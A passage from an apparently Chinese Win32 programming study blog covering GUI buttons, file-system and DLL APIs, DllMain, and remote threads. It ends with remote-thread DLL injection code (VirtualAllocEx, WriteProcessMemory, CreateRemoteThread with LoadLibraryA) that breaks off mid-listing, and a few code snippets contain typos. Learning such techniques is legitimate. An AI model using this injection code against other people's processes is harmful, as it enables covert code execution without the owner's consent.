TEXT(<span class="string">&quot;设置&quot;</span>),</span><br><span class="line">            WS_CHILD | WS_VISIBLE,</span><br><span class="line">            <span class="number">300</span>,</span><br><span class="line">            <span class="number">300</span>,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            <span class="number">30</span>,</span><br><span class="line">            hwnd,</span><br><span class="line">            (HMENU)IDC_BUTTON_1,                        <span class="comment">//将宏定义的ID转换为HMENU类型</span></span><br><span class="line">            g_hInstance,</span><br><span class="line">            <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line">        CreateWindow(</span><br><span class="line">            TEXT(<span class="string">&quot;BUTTON&quot;</span>),                        <span class="comment">// 按钮</span></span><br><span class="line">            TEXT(<span class="string">&quot;获取&quot;</span>),</span><br><span class="line">            WS_CHILD | WS_VISIBLE,</span><br><span class="line">            <span class="number">300</span>,</span><br><span class="line">            <span class="number">250</span>,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            <span class="number">30</span>,</span><br><span class="line">            hwnd,</span><br><span class="line">            (HMENU)IDC_BUTTON_2,                        <span class="comment">//将宏定义的ID转换为HMENU类型</span></span><br><span class="line">            g_hInstance,</span><br><span class="line">            <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (LOWORD(wParam))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> IDC_BUTTON_1:</span><br><span class="line">        &#123;</span><br><span class="line">            SetDlgItemText(hwnd, IDC_EDIT_1, TEXT(<span class="string">&quot;123&quot;</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> IDC_BUTTON_2:</span><br><span class="line">        &#123;</span><br><span class="line">             GetDlgItemText(hwnd, IDC_EDIT_1,szOutBuff,<span class="number">100</span>);</span><br><span class="line">             MessageBox(hwnd, szOutBuff, szOutBuff, MB_OK);</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);<span class="comment">//调用一下默认的消息处理函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个文本框、两个按钮。</p>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h3 id="卷相关API"><a href="#卷相关API" class="headerlink" title="卷相关API"></a>卷相关API</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;获取卷</span><br><span class="line">GetLogicalDrives()</span><br><span class="line"></span><br><span class="line">&lt;2&gt;获取一个所卷的盘符的字符串</span><br><span class="line">GetLogicalDrives()</span><br><span class="line"></span><br><span class="line">&lt;3&gt;获取卷的类型</span><br><span class="line">GetLogicalDrives()</span><br><span class="line"></span><br><span class="line">&lt;4&gt;获取卷的类型</span><br><span class="line">GetVolumelnformation()</span><br></pre></td></tr></table></figure>

<h3 id="目录相关API"><a href="#目录相关API" class="headerlink" title="目录相关API"></a>目录相关API</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;创建目录</span><br><span class="line">CreateDirectory();</span><br><span class="line"></span><br><span class="line">&lt;2&gt;删除目录</span><br><span class="line">RemoveDirectory</span><br><span class="line"></span><br><span class="line">&lt;3&gt;修改目录名称</span><br><span class="line">MoveFile();</span><br><span class="line"></span><br><span class="line">&lt;4&gt;获取程序当前目录</span><br><span class="line">GetCurrentDirectory();</span><br><span class="line"></span><br><span class="line">&lt;5&gt;设置程序当前目录</span><br><span class="line">SetCurrentDirectory</span><br></pre></td></tr></table></figure>

<h2 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h2><h3 id="动态链接库-1"><a href="#动态链接库-1" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库（Dynamic Link Library，缩写DLL），是微软咋Windows操作系统中，实现共享函数库的一种方式，这些库函数的扩展名是.dll或.ocx</p>
<h3 id="创建动态链接库"><a href="#创建动态链接库" class="headerlink" title="创建动态链接库"></a>创建动态链接库</h3><p>首先要告诉编译器，如果定义两个函数，这两个函数是要给别人用的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) 调用约定 返回类型 函数名(参数列表)</span><br></pre></td></tr></table></figure>

<p>比如这两个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> X + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是自己用这两个函数，那么声明函数的时候直接：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br></pre></td></tr></table></figure>

<p>如果是要创建DLL，那么声明的时候使用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) __sdtcall <span class="type">int</span> <span class="title function_">Plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) __sdtcall <span class="type">int</span> <span class="title function_">Sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br></pre></td></tr></table></figure>

<p>声明时也可以使用.def文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">函数名 @编号</span><br><span class="line">函数名 @编号 NONAME</span><br></pre></td></tr></table></figure>

<p>使用序号导出的好处：名字是一段程序最精炼的注释，通过名字可能直接猜测到函数的功能，通过使用序号，可以达到隐藏的目的。</p>
<h3 id="使用DLL"><a href="#使用DLL" class="headerlink" title="使用DLL"></a>使用DLL</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.定义函数指针</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(_cdecl* lpPlus)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(_cdecl* lpSub)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.声明函数指针变量</span></span><br><span class="line">lpPlus myPlus;</span><br><span class="line">lpSub mySub;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//3.动态加载dll到内存中</span></span><br><span class="line">	HINSTANCE hModule = LoadLibrary(<span class="string">&quot;C:\\Users\\23394\\Desktop\\code\\C C++\\Dll1\\Debug\\Dll1.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.获取函数地址</span></span><br><span class="line">	myPlus = (lpPlus)GetProcAddress(hModule, <span class="string">&quot;plus&quot;</span>);</span><br><span class="line">	mySub = (lpSub)GetProcAddress(hModule, <span class="string">&quot;sub&quot;</span>);</span><br><span class="line"><span class="comment">//5.调用函数</span></span><br><span class="line">	<span class="type">int</span> x = myPlus(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> y = mySub(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">//6.释放动态链接库</span></span><br><span class="line">	FreeLibrary(hModule);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>示例代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// MyDLL.cpp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL_PROCESS_ATTACH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL_THREAD_ATTACH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL_THREAD_DETACH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DLL_PROCESS_DETACH\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pch.h中添加：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">int</span> <span class="title function_">plus</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>;</span><br></pre></td></tr></table></figure>

<p>编译完成后生成一个DLL</p>
<p>创建一个新项目，使用这个DLL</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(_cdecl* lpPlus)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(_cdecl* lpSub)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">lpPlus myPlus;</span><br><span class="line">lpSub mySub;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE hModule = LoadLibrary(<span class="string">&quot;C:\\Users\\23394\\Desktop\\code\\C C++\\Dll1\\Debug\\Dll1.dll&quot;</span>);		<span class="comment">// 这里填DLL的路径（绝对路径或相对路径）</span></span><br><span class="line"></span><br><span class="line">	myPlus = (lpPlus)GetProcAddress(hModule, <span class="string">&quot;plus&quot;</span>);</span><br><span class="line">	mySub = (lpSub)GetProcAddress(hModule, <span class="string">&quot;sub&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> x = myPlus(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> y = mySub(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	FreeLibrary(hModule);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>步骤1：将<code>.dll</code> <code>.lib</code>文件放到工程目录下面</p>
<p>步骤2：将&#96;#pragma comment(lib,”DLL名.lib”)添加到调用文件中</p>
<p>步骤3：加入函数的声明</p>
<h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;C:\\Users\\23394\\Desktop\\code\\C C++\\win32AP\\Dll1.lib&quot;</span>)<span class="comment">//填写lib文件的路径</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明函数，这个声明跟在dll中的pch头文件中的声明一样</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> __declspec(dllimport) plus(<span class="type">int</span> x, <span class="type">int</span> y);</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> __declspec(dllimport) sub(<span class="type">int</span> x, <span class="type">int</span> y);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//直接使用函数即可</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;plus(1, 2):%d, sub(3, 1):%d&quot;</span>, plus(<span class="number">1</span>, <span class="number">2</span>), sub(<span class="number">3</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DLL入口函数"><a href="#DLL入口函数" class="headerlink" title="DLL入口函数"></a>DLL入口函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL APIENTRY <span class="title function_">DLLMain</span><span class="params">(HANDLE hModule, 	<span class="comment">//dll被加载到了哪个进程中，返回一个句柄</span></span></span><br><span class="line"><span class="params">						DWORD ul_reason_for_call, <span class="comment">//dll被调用的原因</span></span></span><br><span class="line"><span class="params">						LPVOID lpReserved)</span></span><br></pre></td></tr></table></figure>

<p>参数：DWORD ul_reason_for_call</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>当LoadLibrary时，DLL_PROCESS_ATTACH	(LoadLibrary)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>当FreeLibrary时，DLL_PROCESS_DETACH	(FreeLibrary)</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>当在线程中加载dll时，DLL_THREAD_ATTACH</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>当加载这个dll的线程结束的时候也会再次加载这个dll，此时传递的参数就是DLL_THREAD_DETACH</span><br></pre></td></tr></table></figure>

<h2 id="远程线程"><a href="#远程线程" class="headerlink" title="远程线程"></a>远程线程</h2><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>创建远程线程，就是在另一个进程中创建一个新的线程。比如我的进程是Demo.exe，那么可以在一个IE.exe中创建一个新的线程让他跑起来。</p>
<h3 id="远程线程函数"><a href="#远程线程函数" class="headerlink" title="远程线程函数"></a>远程线程函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateRemoteThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE                 hProcess,		<span class="comment">//在哪个进程中创建这个线程，需要传递一个进程句柄</span></span></span><br><span class="line"><span class="params">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T                 dwStackSize,</span></span><br><span class="line"><span class="params">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">  [in]  LPVOID                 lpParameter,</span></span><br><span class="line"><span class="params">  [in]  DWORD                  dwCreationFlags,</span></span><br><span class="line"><span class="params">  [out] LPDWORD                lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>这个函数与创建线程的函数基本相同，只是多了第一个参数，也就是要在哪个进程中创建这个线程。</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>首先创建一个程序，里面创建一个线程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Sleep(<span class="number">1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;-----%d-----\n&quot;</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个线程在getchar处阻塞。</p>
<p>再写远程线程的程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">MyCreateRemoteThread</span><span class="params">(DWORD dwProcessId, DWORD dwProcessAddr)</span> &#123;</span><br><span class="line">	DWORD dwThreadId;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	<span class="comment">// 1. 获取进程句柄</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line">	<span class="comment">// 判断OpenProcess是否执行成功</span></span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;OpenProcess failed! \n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 2. 创建远程线程</span></span><br><span class="line">	hThread = CreateRemoteThread(</span><br><span class="line">		hProcess,							<span class="comment">// handle to process</span></span><br><span class="line">		<span class="literal">NULL</span>,								<span class="comment">// SD</span></span><br><span class="line">		<span class="number">0</span>,									<span class="comment">// initial stack size</span></span><br><span class="line">		(LPTHREAD_START_ROUTINE)dwProcessAddr,    <span class="comment">// thread function</span></span><br><span class="line">		<span class="literal">NULL</span>,								<span class="comment">// thread argument</span></span><br><span class="line">		<span class="number">0</span>,									<span class="comment">// creation option</span></span><br><span class="line">		&amp;dwThreadId							<span class="comment">// thread identifier</span></span><br><span class="line">	);</span><br><span class="line">	<span class="comment">// 判断CreateRemoteThread是否执行成功</span></span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;CreateRemoteThread failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. 关闭</span></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 返回</span></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	MyCreateRemoteThread(<span class="number">39772</span>, <span class="number">0x6117B0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>MyCreateRemoteThread函数中的第一个参数，传入的是要创建远程线程的程序的PID，也就是上面那个程序的PID；第二个参数是第一个程序中创建的线程的地址。</p>
<h2 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h2><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>什么是注入<br>所谓注入就是在第三方进程不知道或者不允许的情况下将模块或者代码写入对方进程空间，并设法执行的技术。</p>
<p>在安全领域，“注入”是非常重要的一种技术手段，注入与反注入也一直处于不断变化的，而且也愈来愈激烈的对抗当中。</p>
<p>已知的注入方式：</p>
<p>远程线程注入、APC注入、消息钩子注入、注册表注入、导入表注入、输入法注入等等。</p>
<p>事例：</p>
<p>远程线程注入程序.exe：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Test.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LoadDll需要两个参数一个参数是进程ID，一个是DLL文件的路径</span></span><br><span class="line">BOOL <span class="title function_">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="type">const</span> <span class="type">char</span>* szDllPathName)</span> &#123;</span><br><span class="line"></span><br><span class="line">	BOOL bRet;</span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	DWORD dwLength;</span><br><span class="line">	DWORD dwLoadAddr;</span><br><span class="line">	LPVOID lpAllocAddr;</span><br><span class="line">	DWORD dwThreadID;</span><br><span class="line">	HMODULE hModule;</span><br><span class="line"></span><br><span class="line">	bRet = <span class="number">0</span>;</span><br><span class="line">	dwLoadAddr = <span class="number">0</span>;</span><br><span class="line">	hProcess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 1. 获取进程句柄  被注入的进程的句柄</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;OpenProcess failed! \n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2. 获取DLL文件路径的长度，并在最后+1，因为要加上0结尾的长度</span></span><br><span class="line">	dwLength = <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 3. 在目标进程分配内存  在被注入的进程中分别配一段空间，存储DLL的地址</span></span><br><span class="line">	lpAllocAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;VirtualAllocEx failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 4. 拷贝DLL路径名字到被注入进程的内存</span></span><br><span class="line">	bRet = WriteProcessMemory(hProcess, lpAllocAddr, reinterpret_cast&lt;LPCVOID&gt;(szDllPathName), dwLength, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;WriteProcessMemory failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 5. 获取模块句柄</span></span><br><span class="line">	<span class="comment">// LoadLibrary这个函数是在kernel32.dll这个模块中的，所以需要先获取kernel32.dll这个模块的句柄</span></span><br><span class="line">	hModule = GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hModule) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;GetModuleHandle failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 6. 获取LoadLibraryA函数地址</span></span><br><span class="line">	dwLoadAddr = reinterpret_cast&lt;DWORD&gt;(GetProcAddress(hModule, <span class="string">&quot;LoadLibraryA&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span> (!dwLoadAddr) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;GetProcAddress failed! \n&quot;</span>);</span><br><span class="line">		CloseHandle(hModule);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 7. 创建远程线程，加载DLL</span></span><br><span class="line">	hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;(dwLoadAddr), lpAllocAddr, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line">	<span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">		OutputDebugString(<span class="string">&quot;CreateRemoteThread failed! \n&quot;</span>); </span><br><span class="line">		DWORD dwError = GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread failed with error: %d\n&quot;</span>, dwError);</span><br><span class="line"></span><br><span class="line">		CloseHandle(hModule);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 8. 关闭进程句柄</span></span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line"></span><br><span 